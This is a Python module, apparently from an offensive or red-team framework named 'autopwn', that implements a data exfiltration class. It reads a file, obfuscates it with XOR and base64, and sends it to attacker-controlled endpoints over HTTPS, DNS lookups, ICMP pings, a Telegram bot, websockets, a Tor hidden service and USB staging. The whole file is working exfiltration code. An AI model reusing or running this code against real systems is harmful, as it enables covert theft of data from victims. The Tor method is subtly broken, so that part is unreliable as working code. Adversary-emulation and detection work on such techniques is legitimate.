import base64
import logging
import os
import random
import socket
import ssl
import threading
from typing import List, Optional, Tuple

from autopwn_core.shared.attack_context import AttackContext
from autopwn_core.shared.obfuscation import xor_obfuscate
from autopwn_core.shared.audit_logger import log_action
from autopwn_core.shared.tactics_mapping import TacticTag

logger = logging.getLogger("exfiltration")

class DataExfiltrator:
    def __init__(self, ctx: AttackContext):
        self.ctx = ctx
        self.session_id = ctx.session_id
        self.target = ctx.target_host
        self.exfil_methods = {
            "https": self._exfil_via_https,
            "dns": self._exfil_via_dns,
            "icmp": self._exfil_via_icmp,
            "telegram": self._exfil_via_telegram,
            "websocket": self._exfil_via_websocket,
            "tor": self._exfil_via_tor,
            "usb": self._stage_for_usb,
        }

    def _log_exfil(self, method: str, status: str, metadata: Optional[dict] = None):
        log_action(
            actor="autopwn-exfil",
            action=method,
            status=status,
            resource=self.target,
            metadata={
                "session_id": self.session_id,
                "method": method,
                **(metadata or {})
            },
            tags=[TacticTag.EXFILTRATION]
        )

    def _encode(self, data: bytes, method: str) -> bytes:
        obfuscated = xor_obfuscate(data, key=method.encode())
        return base64.b64encode(obfuscated)

    def exfiltrate(self, filepath: str, methods: Optional[List[str]] = None):
        if not os.path.exists(filepath):
            self._log_exfil("file_check", "fail", {"filepath": filepath})
            return

        with open(filepath, "rb") as f:
            data = f.read()

        methods = methods or list(self.exfil_methods.keys())
        for method in methods:
            try:
                encoded = self._encode(data, method)
                success = self.exfil_methods[method](encoded, os.path.basename(filepath))
                self._log_exfil(method, "success" if success else "fail", {"filename": filepath})
            except Exception as e:
                logger.exception(f"[{method}] Exfil failed: {e}")
                self._log_exfil(method, "error", {"error": str(e)})

    def _exfil_via_https(self, data: bytes, filename: str) -> bool:
        try:
            import requests
            r = requests.post("https://exfil-server.internal/api/upload", files={"file": (filename, data)})
            return r.status_code == 200
        except:
            return False

    def _exfil_via_dns(self, data: bytes, filename: str) -> bool:
        try:
            chunks = [data[i:i+32] for i in range(0, len(data), 32)]
            for chunk in chunks:
                domain = f"{chunk.decode(errors='ignore')}.exfil.example.com"
                try:
                    socket.gethostbyname(domain)
                except:
                    continue
            return True
        except:
            return False

    def _exfil_via_icmp(self, data: bytes, filename: str) -> bool:
        try:
            import subprocess
            chunks = [data[i:i+56] for i in range(0, len(data), 56)]
            for chunk in chunks:
                subprocess.run(["ping", "-c", "1", "-p", chunk.hex(), "exfil-gw.internal"], stdout=subprocess.DEVNULL)
            return True
        except:
            return False

    def _exfil_via_telegram(self, data: bytes, filename: str) -> bool:
        try:
            import requests
            BOT_TOKEN = "XXXXXX:YYYYYYYYYYYYYYYYYYYYY"
            CHAT_ID = "123456789"
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                files={"document": (filename, data)},
                data={"chat_id": CHAT_ID}
            )
            return r.status_code == 200
        except:
            return False

    def _exfil_via_websocket(self, data: bytes, filename: str) -> bool:
        try:
            import websocket
            ws = websocket.create_connection("wss://exfil-server.internal/ws")
            ws.send(f"{filename}:{data.decode()}")
            ws.close()
            return True
        except:
            return False

    def _exfil_via_tor(self, data: bytes, filename: str) -> bool:
        try:
            import socks
            import http.client

            conn = http.client.HTTPSConnection("exfilhiddenservice.onion", timeout=10)
            conn.set_tunnel("127.0.0.1", 9050)
            conn.request("POST", "/upload", body=data, headers={"Content-Type": "application/octet-stream"})
            res = conn.getresponse()
            return res.status == 200
        except:
            return False

    def _stage_for_usb(self, data: bytes, filename: str) -> bool:
        try:
            staging_path = "/media/usb/staged_exfil"
            os.makedirs(staging_path, exist_ok=True)
            with open(os.path.join(staging_path, filename), "wb") as f:
                f.write(data)
            return True
        except:
            return False
